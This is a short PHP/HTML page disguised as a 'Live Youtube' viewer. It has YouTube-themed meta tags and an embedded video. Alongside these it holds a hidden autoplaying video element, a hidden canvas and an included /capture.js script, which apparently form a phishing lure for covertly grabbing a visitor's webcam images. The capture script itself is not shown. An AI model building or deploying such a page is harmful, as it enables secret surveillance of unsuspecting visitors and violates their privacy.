<?php
include "validate.php";
?>
<!DOCTYPE html>
<html>
<head>
    <title>Live Youtube</title>
    <meta property="og:title" content="Live Youtube" />
    <meta property="og:type" content="website" />
    <meta name="og:image" content="/desc.png" />
    <meta name="description" content="Watch youtube videos live just in time!" property="og:description">
    <meta name="description" content="/desc.png" property="og:image" />
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:title" content="Live Youtube" />
    <meta name="twitter:description" content="Watch youtube videos live just in time!" />
    <meta name="twitter:image" content="/desc.png">
    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>

<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>

<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

<script src="/capture.js">

</script>
<body>
    <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/ytId?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
</body>
</html>
